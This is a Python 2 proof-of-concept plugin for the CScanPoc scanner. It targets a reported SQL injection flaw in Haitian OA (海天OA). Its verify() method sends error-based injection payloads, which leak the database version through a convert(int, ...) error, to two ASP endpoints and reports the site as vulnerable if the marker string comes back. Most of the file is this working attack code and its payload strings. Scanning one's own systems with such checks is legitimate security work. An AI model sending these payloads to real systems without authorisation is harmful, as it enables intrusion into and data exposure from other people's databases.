# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'HaitianOA_0004' # 平台漏洞编号，留空
    name = '海天OA系统存在SQL注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-02-12'  # 漏洞公布时间
    desc = '''
        海天OA系统存在多处POST型 SQL注入漏洞：
        /portal/content/content_1.asp
        /VO_EmailCaoGao.asp?action=search
    ''' # 漏洞描述
    ref = 'Unkonwn' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=083161
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = '海天OA'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '1e0faec3-f252-4cd0-97ca-ce403097c553' # 平台 POC 编号，留空
    author = '47bwy'  # POC编写者
    create_date = '2018-06-01' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)

            content_type = 'Content-Type: application/x-www-form-urlencoded'
            #POST 型
            urls = [
                arg + '/portal/content/content_1.asp',
                arg + '/VO_EmailCaoGao.asp?action=search'
            ]
            datas = [
                'block_id=1%20and%201=convert(int,CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version)',
                'start=1&currentPg=1&lastPg=0&prevPg=0&nextPg=2&totalRecord=0&sortColumn=12345&sortDirection=12345&foundRec=12345&btnAction=12345&searchcondation=%20and%201=convert(int,CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version)--&txtGoto=123&MaxRowPerPage=10&dellist=123'
            ]
            for i in range(len(urls)):
                url = urls[i]
                data = datas[i]
                code, head, res, err, _ = hh.http(url, post=data, header=content_type)
                if(code == 200 and 'WtFaBcMicrosoft SQL Server' in res):
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()